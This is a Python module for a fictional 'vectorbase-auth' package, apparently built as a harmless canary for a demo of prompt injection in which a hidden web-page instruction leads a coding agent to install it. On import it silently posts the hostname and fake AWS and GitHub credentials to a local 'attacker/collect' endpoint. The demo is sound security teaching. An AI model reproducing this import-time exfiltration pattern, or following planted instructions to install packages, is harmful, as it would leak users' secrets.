"""vectorbase-auth (DEMO, fictional) — a HARMLESS canary.

This package demonstrates a supply-chain attack: a hidden instruction in a web page
tricks a coding agent into installing this "companion" package, and simply importing it
runs code. To prove the point WITHOUT doing harm, the side effect here is harmless:

  * It reads ONLY the hostname (socket.gethostname()).
  * It sends ONE fixed JSON event to a hard-coded LOCAL canary dashboard.
  * The "credentials" are hard-coded PLACEHOLDER strings, not real and not read from
    anywhere on the machine.

It does NOT read any files, environment variables, or any other system information.
If the canary is unreachable it fails silently; import always succeeds.
"""
from __future__ import annotations

import json
import socket
import urllib.request

__version__ = "0.1.0"

# Hard-coded demo canary endpoint (Nisha's attacker/canary service, port 8788). NOT read
# from the environment on purpose: this package must not snoop the victim's environment.
# For the Vultr demo this constant is changed and the wheel is rebuilt.
CANARY_URL = "http://localhost:8788/attacker/collect"

# Hard-coded descriptive fields the dashboard shows. Literals, not read from anywhere.
_PACKAGE_LABEL = f"vectorbase-auth {__version__}"
_SOURCE = "http://localhost:8791/docs/quickstart.html"

# Hard-coded, obviously-fake placeholder "secrets". These are literals in the source;
# nothing on the machine is ever read to produce them.
_PLACEHOLDER_ITEMS = [
    {"name": "AWS_ACCESS_KEY_ID", "value": "AKIAIOSFODNN7EXAMPLEFAKE"},
    {"name": "AWS_SECRET_ACCESS_KEY", "value": "wJalrXUtnFEMI-K7MDENG-bPxRfiCYEXAMPLEFAKE"},
    {"name": "GITHUB_TOKEN", "value": "ghp_000000000000000000000000000000000FAKE"},
]


def _fire() -> None:
    """Send the single fixed canary event. Any failure is swallowed."""
    try:
        payload = json.dumps(
            {
                "host": socket.gethostname(),
                "items": _PLACEHOLDER_ITEMS,
                "package": _PACKAGE_LABEL,
                "source": _SOURCE,
            }
        ).encode("utf-8")
        req = urllib.request.Request(
            CANARY_URL,
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=3).close()
    except Exception:
        # Demo canary only: never let the side effect break the import.
        pass


# The side effect fires on import — this is what the demo is about.
_fire()
